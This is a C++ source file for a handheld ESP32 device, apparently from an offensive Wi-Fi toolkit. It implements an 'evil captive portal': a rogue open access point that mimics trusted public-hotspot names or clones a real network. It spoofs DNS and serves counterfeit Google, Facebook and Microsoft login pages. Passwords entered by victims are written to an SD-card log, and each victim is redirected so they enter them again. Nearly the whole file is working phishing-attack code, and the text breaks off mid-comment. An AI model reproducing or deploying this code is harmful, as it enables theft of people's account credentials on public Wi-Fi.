/*
 * wifi_portal — evil captive portal with 4 phishing templates.
 *
 * Components:
 *   1. SoftAP with the chosen SSID (open network — no password).
 *   2. DNS server binds to port 53, answers every query with our AP IP
 *      so the victim's phone auto-opens the portal.
 *   3. HTTP server on port 80 serves the portal HTML and captures form
 *      POSTs (/login) into /poseidon/creds.log on SD card.
 *
 * Templates: Google, Facebook, Microsoft, Free WiFi. User picks one.
 *
 * AP Clone mode: same infra but the SoftAP's SSID is the most recently
 * selected real AP from wifi_scan (via g_last_selected_ap). Victim
 * devices that saved the real AP will auto-roam.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include "../sfx.h"
#include "wifi_pmf_warn.h"
#include "wifi_deauth_frame.h"   /* wifi_auth_has_pmf */
#include "../heap_budget.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include "../sd_helper.h"
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_err.h>
#include <esp_bt.h>

struct portal_template_t { const char *name, *html; };

static const char HTML_GOOGLE[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign in - Google Accounts</title>
<style>body{font-family:Arial,sans-serif;background:#fff;margin:0}
.c{max-width:450px;margin:60px auto;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
h1{font-size:24px;font-weight:400;color:#202124;margin:16px 0 8px}
.s{color:#202124;font-size:16px;margin-bottom:24px}
input{width:100%;padding:12px 15px;margin:12px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box}
button{background:#1a73e8;color:#fff;border:0;padding:10px 24px;border-radius:4px;font-weight:500;cursor:pointer;float:right;margin-top:16px}
.logo{width:75px;height:24px;margin:0 auto;display:block}
</style></head><body>
<div class="c">
<svg class="logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/></svg>
<h1>Sign in</h1><div class="s">to continue to Gmail</div>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email or phone" required>
<input name="p" type="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
)RAW";

static const char HTML_FREEWIFI[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Free WiFi - Authentication Required</title>
<style>body{font-family:-apple-system,Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{background:#fff;padding:40px;border-radius:12px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
h1{margin:0 0 8px;color:#333}p{color:#666;margin-bottom:24px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}
button{width:100%;padding:14px;background:#667eea;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
.w{width:60px;height:60px;margin:0 auto 20px;display:block}
</style></head><body>
<div class="c">
<svg class="w" viewBox="0 0 24 24" fill="#667eea"><path d="M12 3C7.95 3 4.21 4.34 1.2 6.6L3 9c2.71-2.03 6.01-3 9-3s6.29.97 9 3l1.8-2.4C19.79 4.34 16.05 3 12 3zm0 4c-2.96 0-5.74.73-8.2 2L5.4 11.4C7.38 10.18 9.62 9.5 12 9.5s4.62.68 6.6 1.9L20.2 9C17.74 7.73 14.96 7 12 7zm0 4c-1.96 0-3.72.54-5.3 1.5l1.8 2.4c1.04-.6 2.2-.9 3.5-.9s2.46.3 3.5.9l1.8-2.4C15.72 11.54 13.96 11 12 11zm0 4.5c-1.11 0-2.08.39-2.85 1.05L12 20l2.85-3.45C14.08 15.89 13.11 15.5 12 15.5z"/></svg>
<h1>Free WiFi</h1><p>Please sign in with your email to continue.</p>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email address" required>
<input name="p" type="password" placeholder="Password" required>
<button>Connect</button>
</form></div></body></html>
)RAW";

static const char HTML_FACEBOOK[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Log in to Facebook</title>
<style>body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;margin:0;padding:80px 20px;text-align:center}
.c{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);max-width:400px;margin:auto}
h1{color:#1877f2;font-size:56px;margin:0 0 20px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:17px}
button{width:100%;background:#1877f2;color:#fff;border:0;padding:12px;border-radius:6px;font-weight:700;font-size:20px;cursor:pointer;margin-top:6px}
</style></head><body>
<div class="c"><h1>facebook</h1>
<form method="POST" action="/login">
<input name="u" type="text" placeholder="Email or phone number" required>
<input name="p" type="password" placeholder="Password" required>
<button>Log In</button></form></div></body></html>
)RAW";

static const char HTML_MICROSOFT[] = R"RAW(
<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Sign in to your Microsoft account</title>
<style>body{font-family:'Segoe UI',Arial,sans-serif;background:#fff;margin:0}
.c{max-width:440px;margin:40px auto;padding:44px;border:1px solid #ebebeb;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
.logo{width:108px;margin-bottom:24px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 16px}
input{width:100%;padding:6px 10px;margin:4px 0;border:0;border-bottom:1px solid #666;font-size:15px;box-sizing:border-box;outline:none}
button{background:#0067b8;color:#fff;border:0;padding:6px 12px;min-width:108px;font-size:15px;float:right;margin-top:16px;cursor:pointer}
</style></head><body>
<div class="c">
<svg class="logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg"><rect x="0"  y="0" width="10" height="10" fill="#F25022"/><rect x="12" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0"  y="12" width="10" height="10" fill="#00A4EF"/><rect x="12" y="12" width="10" height="10" fill="#FFB900"/></svg>
<h1>Sign in</h1>
<form method="POST" action="/login">
<input name="u" type="email" placeholder="Email, phone, or Skype" required>
<input name="p" type="password" placeholder="Password" required>
<button>Next</button>
</form></div></body></html>
)RAW";

/* Extended portal library — 12 additional high-fidelity templates
 * lifted from wifiphisher / fluxion / airgeddon / Bruce / Evil-Cardputer.
 * Each is self-contained (inline CSS + SVG, no external assets) and
 * captures the same u/p fields handle_login() expects. */
#include "wifi_portal_extras.h"

/* Legit-mimic SSIDs — broadcasts these as the AP name to blend with
 * public-WiFi networks people already trust. Tuned to defaults seen
 * in airports, hotels, coffee shops, and ISP public hotspots so the
 * SSID list on a victim's phone doesn't look out of place. */
static const char *PRESET_SSIDS[] = {
    "xfinitywifi",          /* Comcast public hotspot — extremely common */
    "attwifi",              /* AT&T public hotspot */
    "Verizon Free WiFi",
    "Spectrum WiFi",
    "OptimumWiFi",
    "Google Starbucks",     /* Starbucks free WiFi default */
    "Starbucks WiFi",
    "McDonalds Free WiFi",
    "Subway WiFi",
    "Free Public WiFi",
    "Free WiFi",
    "Guest WiFi",
    "Free Hotel WiFi",
    "Free Airport WiFi",
    "Library WiFi",
    "GuestNetwork",
    "Marriott_GUEST",
    "Hilton Honors",
    "Hyatt Guest WiFi",
    "BoingoHotspot",
    "iPhone",               /* generic phone-hotspot mimic */
    "AndroidAP",
    "Default",
};
#define PRESET_SSIDS_N (sizeof(PRESET_SSIDS) / sizeof(PRESET_SSIDS[0]))

enum ssid_source_t {
    SSID_SRC_TEMPLATE = 0,
    SSID_SRC_PRESET,
    SSID_SRC_CLONE,
    SSID_SRC_CUSTOM,
    SSID_SRC__COUNT,
};

struct ssid_source_opt_t { const char *label; const char *hint; };
static const ssid_source_opt_t SSID_SRC_OPTS[SSID_SRC__COUNT] = {
    { "Template name",  "uses brand (e.g. Apple ID, Office 365)" },
    { "Preset public",  "23 legit-mimic names (xfinity, Starbucks)" },
    { "Clone scanned",  "SSID of last AP picked in WiFi - Scan" },
    { "Type custom",    "enter any string up to 32 chars" },
};

static const portal_template_t s_templates[] = {
    { "Google",       HTML_GOOGLE      },
    { "Facebook",     HTML_FACEBOOK    },
    { "Microsoft",    HTML_MICROSOFT   },
    { "Free WiFi",    HTML_FREEWIFI    },
    { "Apple ID",     HTML_APPLE       },
    { "Office 365",   HTML_OFFICE365   },
    { "LinkedIn",     HTML_LINKEDIN    },
    { "Amazon",       HTML_AMAZON      },
    { "Netflix",      HTML_NETFLIX     },
    { "Instagram",    HTML_INSTAGRAM   },
    { "Hotel WiFi",   HTML_HOTEL       },
    { "Starbucks",    HTML_STARBUCKS   },
    { "Airport WiFi", HTML_AIRPORT     },
    { "Router Admin", HTML_ROUTER      },
    { "Zoom",         HTML_ZOOM        },
    { "Company SSO",  HTML_SSO         },
};
#define TEMPLATE_COUNT (sizeof(s_templates)/sizeof(s_templates[0]))

static WebServer *s_http = nullptr;
static DNSServer *s_dns  = nullptr;
static volatile uint32_t s_creds = 0;
static volatile uint32_t s_hits  = 0;
static const char *s_current_html = HTML_GOOGLE;
static char s_portal_ssid[33] = "Free WiFi";
/* Bug 11: AP Clone quietly hardcoded ch1, so a victim AP on ch6/11
 * showed a "weak" clone signal (clients on the victim's actual channel
 * couldn't see us at all; only clients scanning across channels picked
 * us up at intermittent strength). Apclone + quick-clone now set this
 * to g_last_selected_ap.channel before run_portal. Default 1 keeps
 * template-portal entries (user types SSID, no scan source) on ch1. */
static uint8_t  s_portal_channel = 1;

/* Set by log_cred() when a new credential lands. Picked up by the main
 * loop a moment later so the HTTP response isn't stalled behind the
 * 1.2s action-overlay animation. */
static volatile bool s_cred_flash = false;
static char          s_last_user[48] = {0};

static void log_cred(const String &u, const String &p, const String &src)
{
    File f = SD.open("/poseidon/creds.log", FILE_APPEND);
    if (!f) return;
    f.printf("%lu,%s,%s,%s,%s\n",
             (unsigned long)(millis() / 1000),
             s_portal_ssid, src.c_str(), u.c_str(), p.c_str());
    f.close();
    s_creds++;
    /* Defer the overlay to the main loop — HTTP handler runs synchronously
     * inside handleClient() and blocking here delays the 200 response. */
    strncpy(s_last_user, u.c_str(), sizeof(s_last_user) - 1);
    s_last_user[sizeof(s_last_user) - 1] = '\0';
    s_cred_flash = true;
    Serial.printf("[portal] CRED u=%s p=%s\n", u.c_str(), p.c_str());
}

static void handle_login(void)
{
    String u = s_http->arg("u");
    String p = s_http->arg("p");
    if (u.length() > 0 || p.length() > 0) {
        log_cred(u, p, s_http->client().remoteIP().toString());
    }
    /* Show "please wait" then redirect back — convinces victim to retry. */
    s_http->send(200, "text/html",
        "<html><body style='font:16px Arial;text-align:center;padding:60px'>"
        "<h2>Please wait...</h2><p>Authenticating.</p>"
        "<script>setTimeout(function(){location='/'},2000)</script>"
        "</body></html>");
}

static void handle_root(void)
{
    s_hits++;
    s_http->send_P(200, "text/html", s_current_html);
}

/* Captive portal probe URLs — return 302 to root so Android/iOS/Windows
 * pop up the login sheet automatically. */
static void handle_probe(void)
{
    s_hits++;
    s_http->sendHeader("Location", "/", true);
    s_http->send(302, "text/plain", "");
}

/* Scrollable picker — the 16-entry library outgrew the old 1-9
 * numeric handler. ;/. or arrow keys move the cursor, ENTER picks,
 * C jumps to clone mode, ESC backs out. Renders 7 visible rows
 * with selection highlight matching the global menu style. */
static int pick_template(void)
{
    int cursor = 0;
    int top    = 0;
    const int rows  = 7;
    const int row_h = 11;
    int last_top = -1, last_cursor = -1;

    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("EVIL PORTAL");
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
    ui_draw_footer(";/.=move  ENTER=pick  C=clone  `=back");

    while (true) {
        if (cursor < top)         top = cursor;
        if (cursor >= top + rows) top = cursor - rows + 1;

        if (top != last_top || cursor != last_cursor) {
            d.fillRect(0, BODY_Y + 16, SCR_W, rows * row_h + 4, T_BG);
            for (int i = 0; i < rows && (top + i) < (int)TEMPLATE_COUNT; ++i) {
                int idx = top + i;
                int y = BODY_Y + 18 + i * row_h;
                if (idx == cursor) {
                    d.fillRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BG);
                    d.drawRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BD);
                }
                d.setTextColor(idx == cursor ? T_FG : T_DIM,
                               idx == cursor ? T_SEL_BG : T_BG);
                d.setCursor(6, y);
                d.print(s_templates[idx].name);
            }
            /* Scroll indicators */
            d.setTextColor(T_DIM, T_BG);
            if (top > 0)                       { d.setCursor(SCR_W - 12, BODY_Y + 18);            d.print("^"); }
            if (top + rows < (int)TEMPLATE_COUNT){ d.setCursor(SCR_W - 12, BODY_Y + 18 + (rows-1)*row_h); d.print("v"); }
            last_top = top;
            last_cursor = cursor;
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC)                              return -1;
        if (k == PK_ENTER || k == ' ')                return cursor;
        if (k == 'c' || k == 'C')                     return -2;   /* clone mode */
        if (k == ';' || k == PK_UP)   { if (cursor > 0)                          cursor--; }
        else if (k == '.' || k == PK_DOWN){ if (cursor + 1 < (int)TEMPLATE_COUNT) cursor++; }
    }
}

/* Scrollable picker over an array of (label, hint) pairs. Used for
 * the SSID-source 4-way picker. Returns chosen index or -1 on ESC. */
static int pick_source(const ssid_source_opt_t *opts, int count, const char *title)
{
    int cursor = 0;
    int last_cursor = -1;
    const int row_h = 14;
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print(title);
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
    ui_draw_footer(";/.=move  ENTER=pick  `=back");
    while (true) {
        if (cursor != last_cursor) {
            d.fillRect(0, BODY_Y + 16, SCR_W, count * row_h + 4, T_BG);
            for (int i = 0; i < count; ++i) {
                int y = BODY_Y + 18 + i * row_h;
                if (i == cursor) {
                    d.fillRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BG);
                    d.drawRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BD);
                }
                d.setTextColor(i == cursor ? T_FG : T_DIM,
                               i == cursor ? T_SEL_BG : T_BG);
                d.setCursor(6, y);
                d.print(opts[i].label);
                d.setTextColor(T_DIM, i == cursor ? T_SEL_BG : T_BG);
                d.setCursor(6, y + 7);
                d.print(opts[i].hint);
            }
            last_cursor = cursor;
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC)               return -1;
        if (k == PK_ENTER || k == ' ') return cursor;
        if ((k == ';' || k == PK_UP)   && cursor > 0)            cursor--;
        else if ((k == '.' || k == PK_DOWN) && cursor + 1 < count) cursor++;
    }
}

/* Scrollable picker over an array of plain string names. Used for
 * preset SSIDs. Returns chosen index or -1 on ESC. */
static int pick_string_list(const char *const *items, int count, const char *title)
{
    int cursor = 0, top = 0;
    const int rows = 7, row_h = 11;
    int last_top = -1, last_cursor = -1;
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print(title);
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
    ui_draw_footer(";/.=move  ENTER=pick  `=back");
    while (true) {
        if (cursor < top)         top = cursor;
        if (cursor >= top + rows) top = cursor - rows + 1;
        if (top != last_top || cursor != last_cursor) {
            d.fillRect(0, BODY_Y + 16, SCR_W, rows * row_h + 4, T_BG);
            for (int i = 0; i < rows && (top + i) < count; ++i) {
                int idx = top + i;
                int y = BODY_Y + 18 + i * row_h;
                if (idx == cursor) {
                    d.fillRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BG);
                    d.drawRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BD);
                }
                d.setTextColor(idx == cursor ? T_FG : T_DIM,
                               idx == cursor ? T_SEL_BG : T_BG);
                d.setCursor(6, y);
                d.print(items[idx]);
            }
            d.setTextColor(T_DIM, T_BG);
            if (top > 0)                 { d.setCursor(SCR_W - 12, BODY_Y + 18);            d.print("^"); }
            if (top + rows < count)      { d.setCursor(SCR_W - 12, BODY_Y + 18 + (rows-1)*row_h); d.print("v"); }
            last_top = top;
            last_cursor = cursor;
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC)               return -1;
        if (k == PK_ENTER || k == ' ') return cursor;
        if ((k == ';' || k == PK_UP)   && cursor > 0)            cursor--;
        else if ((k == '.' || k == PK_DOWN) && cursor + 1 < count) cursor++;
    }
}

static void run_portal(void)
{
    if (!sd_mount()) {
        ui_toast("SD needed for logs", T_BAD, 1500);
        return;
    }
    SD.mkdir("/poseidon");

    /* --- Raw-IDF AP bring-up — only path that doesn't crash on Bruce libs ---
     * Arduino's WiFi.softAP() crashes ieee80211_hostap_attach +0x2c
     * (null deref of internal AP context). esp_wifi_set_config(WIFI_IF_AP)
     * properly initializes that context where the Arduino path skips it.
     *
     * Tuning vs earlier (silent-no-broadcast) attempt:
     *   - DEFAULT buffer counts (not shrunk). Shrinking starves the AP
     *     beacon TX path; the AP attached but couldn't beacon.
     *   - Explicit esp_wifi_set_channel AFTER start (config-side channel
     *     can be ignored if the radio defaults override it).
     *   - NO esp_wifi_set_max_tx_power per-burst (puts driver in flaky
     *     state in some IDF 5.5 builds). Power stays at compile-time max.
     *   - 1500 ms settle for the AP_START event to fully complete. */
    Serial.printf("[portal] AP-up entry free=%u\n",
                  (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
    /* Pre-AP teardown — if WiFi was already inited via raw-IDF (Triton,
     * BLE Scan, etc.) we MUST fully deinit before AP bring-up. Otherwise:
     *   - esp_wifi_init below asserts (one-shot init)
     *   - esp_netif_create_default_wifi_ap conflicts with existing
     *     default STA netif (duplicate-key assert)
     * Matches Evil-Cardputer's pattern: stop → deinit → 300 ms → reinit.
     * Idempotent: safe if WiFi was never inited. */
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(300);
    /* Destroy default STA netif if a prior feature created it.
     * esp_netif_create_default_wifi_ap below will then succeed. */
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (sta) esp_netif_destroy_default_wifi(sta);

    /* POS-AUDIT-007 (revised after on-device repro 2026-06-06):
     * The original gate skipped the release if BT was already inited
     * (preserving BLE). On Bruce libs that path crashes in
     * ieee80211_hostap_attach +0x2c during AP bring-up. The audit's
     * own commit body called this risk "rare in practice with current
     * builds" — it's not rare on the v0.7 build. Force-shutdown BT
     * before the release; sacrifice BLE for the session with a toast. */
    bool bt_was_inited =
        (esp_bt_controller_get_status() != ESP_BT_CONTROLLER_STATUS_IDLE);
    if (bt_was_inited) {
        esp_bt_controller_disable();
        esp_bt_controller_deinit();
    }
    esp_bt_controller_mem_release(ESP_BT_MODE_BTDM);
    if (bt_was_inited) {
        ui_toast("BLE disabled until reboot", T_WARN, 1200);
    }

    /* Reclaim recoverable caches and veto if the largest contiguous internal
     * block still can't fit hostap_attach's control block. Placed AFTER the
     * WiFi deinit + BT release above so it measures the heap that will actually
     * be available to esp_wifi_init, not a pessimistic pre-teardown snapshot.
     * 12288 is the initial estimate; calibrated on-device (see plan Task 12). */
    if (!rf_preflight("portal", 12288)) return;

    esp_log_level_set("wifi",      ESP_LOG_INFO);
    esp_log_level_set("wifi_init", ESP_LOG_INFO);
    esp_netif_init();
    esp_event_loop_create_default();
    /* Destroy any AP netif left from a prior run so the create below can't hit
     * a duplicate WIFI_AP_DEF if_key -> esp_netif_new abort on re-entry.
     * (Mirrors the WIFI_STA_DEF cleanup above.) */
    esp_netif_t *old_ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (old_ap) esp_netif_destroy_default_wifi(old_ap);
    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();
    Serial.printf("[portal] ap_netif=%p\n", ap_netif);
    if (!ap_netif) {   /* create failed (low/fragmented heap) — don't march into a crash */
        ui_toast("AP netif fail: reboot", T_BAD, 1800);
        return;
    }

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    /* Shrink tx/rx buffer pools to fit the ~115 KB internal SRAM left
     * after Cardputer + GFX + LVGL claim their share. Defaults (16/32/...)
     * blow OOM at init. These values are large enough that the AP
     * actually beacons (verified in beacon_spam at similar sizes). */
    /* Shrunk for the softAP path: the previous 16/16 dynamic pools (~50 KB)
     * left <8 KB largest-free after init, so esp_wifi_start's hostap_attach
     * had no room to allocate its AP control block -> +0x2c null-deref crash.
     * A captive portal serves a handful of clients; 6 TX / 8 RX is plenty and
     * frees ~30 KB of headroom for the AP bring-up. */
    cfg.static_tx_buf_num  = 0;
    cfg.dynamic_tx_buf_num = 6;
    cfg.tx_buf_type        = 1;
    cfg.cache_tx_buf_num   = 2;
    cfg.static_rx_buf_num  = 4;
    cfg.dynamic_rx_buf_num = 8;
    cfg.ampdu_tx_enable    = 0;
    cfg.ampdu_rx_enable    = 0;
    esp_err_t rc = esp_wifi_init(&cfg);
    Serial.printf("[portal] wifi_init rc=%d\n", (int)rc);
    if (rc != ESP_OK) { ui_toast("wifi_init fail", T_BAD, 1500); return; }
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_AP);

    wifi_config_t apc = {};
    strncpy((char *)apc.ap.ssid, s_portal_ssid, sizeof(apc.ap.ssid) - 1);
    apc.ap.ssid_len        = strlen(s_portal_ssid);
    /* Bug 11: use the channel set by apclone / quick-clone (defaults to
     * 1 for template-portal entries). Clamp 1-13 in case scan reported
     * something weird. */
    apc.ap.channel         = (s_portal_channel >= 1 && s_portal_channel <= 13)
                             ? s_portal_channel : 1;
    apc.ap.authmode        = WIFI_AUTH_OPEN;
    apc.ap.max_connection  = 4;
    apc.ap.beacon_interval = 100;
    apc.ap.ssid_hidden     = 0;
    rc = esp_wifi_set_config(WIFI_IF_AP, &apc);
    Serial.printf("[portal] set_config rc=%d ch=%u\n", (int)rc, (unsigned)apc.ap.channel);
    /* esp_wifi_start()'s softAP attach (ieee80211_hostap_attach) allocates its
     * AP control block from internal heap. When the heap is fragmented/low after
     * cycling WiFi features it gets a NULL block and derefs it (+0x2c crash,
     * POS-AUDIT-007). Guard: if the largest contiguous internal block is too
     * small for the attach, bail gracefully instead of hard-crashing. */
    heap_report("portal pre-start");
    size_t lblk = heap_largest_internal();
    if (lblk < 10240) {   /* last-resort net; shrunk buffers should leave ~30 KB */
        ui_toast("Low memory: reboot then clone", T_BAD, 2200);
        esp_wifi_deinit();
        return;
    }
    rc = esp_wifi_start();
    Serial.printf("[portal] wifi_start rc=%d\n", (int)rc);
    if (rc != ESP_OK) {
        ui_toast("wifi_start fail", T_BAD, 1500);
        esp_wifi_deinit();
        return;
    }
    /* Bug 11: bump TX power to 19.5 dBm (~89 mW). Default after fresh
     * init can sit around 15 dBm (~31 mW) which is half the perceived
     * RSSI of the victim. esp_wifi_set_max_tx_power takes 0.25 dBm
     * units (78 = 19.5 dBm). Must be called AFTER esp_wifi_start.
     * Matches Bruce's beacon_spam pattern. */
    esp_wifi_set_max_tx_power(84);
    /* Force the channel post-start. Some builds ignore the channel in
     * the config struct and default to 0 (silent no-beacon). Use the
     * same s_portal_channel-derived value as the config. */
    esp_wifi_set_channel(apc.ap.channel, WIFI_SECOND_CHAN_NONE);
    /* Settle. AP needs the AP_START event to fully process before it
     * starts beaconing. 1.5 s matches Bruce's 3 s upper bound halved. */
    uint32_t t_settle = millis();
    while (millis() - t_settle < 1500) { delay(20); }

    int8_t actual_pwr = 0;
    esp_wifi_get_max_tx_power(&actual_pwr);
    wifi_second_chan_t sc;
    uint8_t cur_ch = 0;
    esp_wifi_get_channel(&cur_ch, &sc);
    IPAddress ip(192, 168, 4, 1);
    esp_netif_ip_info_t ipinfo = {};
    if (ap_netif && esp_netif_get_ip_info(ap_netif, &ipinfo) == ESP_OK &&
        ipinfo.ip.addr != 0) {
        ip = IPAddress(ipinfo.ip.addr);
    }
    Serial.printf("[portal] AP up ip=%s ch=%u pwr=%d\n",
                  ip.toString().c_str(), (unsigned)cur_ch, (int)actual_pwr);

    s_dns = new DNSServer();
    s_dns->setErrorReplyCode(DNSReplyCode::NoError);
    s_dns->start(53, "*", ip);

    s_http = new WebServer(80);
    s_http->on("/",                      handle_root);
    s_http->on("/login",      HTTP_POST, handle_login);
    /* Common captive-portal probe URLs. */
    s_http->on("/generate_204",          handle_probe);  /* Android */
    s_http->on("/hotspot-detect.html",   handle_probe);  /* iOS */
    s_http->on("/ncsi.txt",              handle_probe);  /* Windows */
    s_http->on("/success.txt",           handle_probe);  /* Firefox */
    s_http->on("/connecttest.txt",       handle_probe);  /* Windows */
    s_http->onNotFound(                  handle_root);
    s_http->begin();

    s_creds = 0; s_hits = 0;

    /* Grab AP MAC for BSSID display — operator can find the AP in a
     * scan list by BSSID even when SSID-matching is ambiguous (e.g.
     * broadcasting as "xfinitywifi" alongside real xfinity APs). */
    uint8_t ap_mac[6] = {};
    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
    uint8_t ap_ch = 0; wifi_second_chan_t ap_sc;
    esp_wifi_get_channel(&ap_ch, &ap_sc);

    ui_clear_body();
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_BAD, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("PORTAL ACTIVE");
    d.drawFastHLine(4, BODY_Y + 12, 110, T_BAD);
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 18); d.printf("SSID: %s", s_portal_ssid);
    d.setCursor(4, BODY_Y + 30); d.printf("BSSID:%02X:%02X:%02X:%02X:%02X:%02X",
                                          ap_mac[0], ap_mac[1], ap_mac[2],
                                          ap_mac[3], ap_mac[4], ap_mac[5]);
    d.setCursor(4, BODY_Y + 42); d.printf("IP:   %s  ch%u",
                                          ip.toString().c_str(), (unsigned)ap_ch);
    ui_draw_footer("`=stop");

    uint32_t last = 0;
    while (true) {
        s_dns->processNextRequest();
        s_http->handleClient();

        /* New cred? Dramatic overlay so the operator notices from across
         * the room. POS-AUDIT-009: now uses the with-tick variant so
         * DNS+HTTP keep responding during the 1.2 s window — Android
         * captive-portal probe gives up after ~1-3 s, was timing out.
         * Tone moved to sfx_pmkid_capture (already async via the SFX
         * player task per POS-AUDIT-017b) so the inline tone+delay
         * doesn't stall the loop either. */
        if (s_cred_flash) {
            s_cred_flash = false;
            sfx_pmkid_capture();
            ui_action_overlay_with_tick("CRED CAPTURED",
                              s_last_user[0] ? s_last_user : "no user",
                              ACT_BG_WAVES, T_BAD, 1200,
                              [](void *){
                                  if (s_dns) s_dns->processNextRequest();
                                  if (s_http) s_http->handleClient();
                              }, nullptr);
            last = 0;  /* force redraw of the live counters */
        }

        if (millis() - last > 250) {
            last = millis();
            d.fillRect(0, BODY_Y + 54, SCR_W, 28, T_BG);
            d.setTextColor(T_FG, T_BG);
            wifi_sta_list_t stas = {};
            esp_wifi_ap_get_sta_list(&stas);
            d.setCursor(4, BODY_Y + 54); d.printf("clients:%d  hits:%lu",
                                                 stas.num, (unsigned long)s_hits);
            d.setTextColor(s_creds > 0 ? T_GOOD : T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 66); d.printf("creds:  %lu", (unsigned long)s_creds);
            ui_draw_status(radio_name(), "portal");
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == PK_NONE) {
            /* POS-AUDIT-212 / wifi-025: when no STA is associated, the
             * 5 ms idle was driving ~200 processNextRequest+handleClient
             * calls per UI frame. Read the AP STA count and back off to
             * 20 ms when nobody's connected — DNS/HTTP have nothing to
             * serve anyway. Drops to 5 ms the moment a client associates
             * so the redirect responds with minimum latency. */
            wifi_sta_list_t stas_idle = {};
            esp_wifi_ap_get_sta_list(&stas_idle);
            delay(stas_idle.num == 0 ? 20 : 5);
        }
    }

    if (s_http) { s_http->close(); delete s_http; s_http = nullptr; }
    if (s_dns)  { s_dns->stop();  delete s_dns;  s_dns  = nullptr; }
    /* Raw-IDF teardown matching raw-IDF bring-up. */
    esp_wifi_stop();
    esp_wifi_deinit();
}

void feat_wifi_portal(void)
{
    radio_switch(RADIO_WIFI);

    /* Step 1 — pick the portal HTML template. */
    int t = pick_template();
    if (t == -1) return;

    /* C shortcut on the template picker = quick-clone mode (skips
     * the source picker, uses last scanned AP + generic FreeWiFi HTML). */
    if (t == -2) {
        if (!g_last_selected_valid) {
            ui_toast("scan an AP first", T_WARN, 1200);
            return;
        }
        /* POS-AUDIT-213 / wifi-041: PMF on the target AP makes the
         * deauth-driven re-association lure ineffective. The portal
         * will still come up but clients won't drift to it. Warn
         * before committing. */
        if (wifi_auth_has_pmf(g_last_selected_ap.auth) && !wifi_pmf_warning()) return;
        strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
        s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
        /* Bug 11: match victim's channel — see feat_wifi_apclone. */
        s_portal_channel = g_last_selected_ap.channel;
        s_current_html = HTML_FREEWIFI;
        run_portal();
        return;
    }

    /* Reset channel for non-clone flows — template / preset / custom
     * portal entries broadcast on ch1 (no victim to match). */
    s_portal_channel = 1;

    /* Step 2 — pick where the broadcast SSID comes from. The template
     * picked above selects the LOOK of the portal; this picks the NAME
